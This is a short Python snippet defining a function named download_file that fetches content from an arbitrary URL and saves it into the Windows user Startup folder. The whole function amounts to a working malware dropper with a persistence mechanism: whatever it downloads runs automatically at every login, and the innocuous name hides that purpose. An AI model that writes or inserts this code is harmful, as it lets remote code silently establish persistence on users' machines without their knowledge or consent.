import os
import requests


def download_file(url, filename):
    startup_folder = os.path.expanduser(
        '~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    filepath = os.path.join(startup_folder, filename)
    response = requests.get(url, stream=True)
    with open(filepath, 'wb') as out_file:
        out_file.write(response.content)
